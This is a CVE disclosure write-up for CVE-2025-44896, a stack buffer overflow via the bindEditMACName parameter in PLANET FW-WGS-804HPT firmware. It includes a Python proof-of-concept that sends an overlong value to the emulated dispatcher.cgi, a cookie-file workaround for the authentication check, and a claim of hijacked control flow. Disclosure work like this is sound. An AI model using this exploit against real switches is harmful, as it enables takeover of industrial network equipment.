---
title: web_acl_bindEdit_post-bindEditMACName-StackOverflow
date: 2025-04-18 15:33:38
tags: cve
---

**Affected Product**: FW-WGS-804HPT

**Affected Firmware Versions**:  v1.305b241111

**Vulnerability Type**: Buffer Overflow

**CVE Identifier**: CVE-2025-44896



# FW-WGS-804HPT_v1.305b241111 introduced

The WGS-804HPT-V2 is a ruggedized industrial-grade Ethernet switch designed for harsh environments and mission-critical applications. As part of PLANET Technology's Industrial Automation Series, this 8-port managed switch combines Power over Ethernet (PoE+) capabilities with industrial durability, making it ideal for building automation, smart infrastructure, and IoT deployments.



Official Product Page: https://www.planet.com.tw/en/product/wgs-804hpt-v2





# web_acl_bindEdit_post-bindEditMACName

I discovered a  stack overflow vulnerability in the Planet router.

By analyzing the dispatcher file in the bin directory, I found that the function web_acl_bindEdit_post  contains a stack overflow vulnerability.

The stack overflow can be triggered by bindEditMACName key value, which leads to a strcpy stack overflow.

![image-20250321152223389](../res/202503211522484-174514072222116.png)

In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of "20 0 0", and its function is to create a cookie with sufficient permissions to access this route.

```json
20 0 0
```



![](../res/image-20250416155836658-174479031857116.png)

可以看到代码中存在由strcpy造成的栈溢出

# How can we simulate a router

﻿The content of the **poc.py** file is as follows:

```json
import os


a = 0xC20
var_name = "bindEditMACName"
b = 'a' * 0x300
c = "bindEditMAC=111"

poc_content = f"&cmd={a}&{var_name}={b}&{c}"
with open('poc', 'w') as f:
    f.write(poc_content)

command = (
    "sudo chroot . ./qemu-mips-static "
    "-E REQUEST_METHOD=POST "
    "-E HTTP_COOKIE='hid=0' "
    "-L ./lib "
    "-g 1234 "
    "./dispatcher.cgi "
    "< poc"  
)


os.system(command)



```

# Attack result

![image-20250416160503196](../res/image-20250416160503196-174479070420817-17451482829331.png)

![image-20250416160624802](../res/image-20250416160624802.png)



![image-20250416160732429](../res/image-20250416160732429-174479085346818.png)

Through the above image, we can see that we have overflowed to 0x278 and successfully hijacked the control flow. If necessary, more can be overflowed.
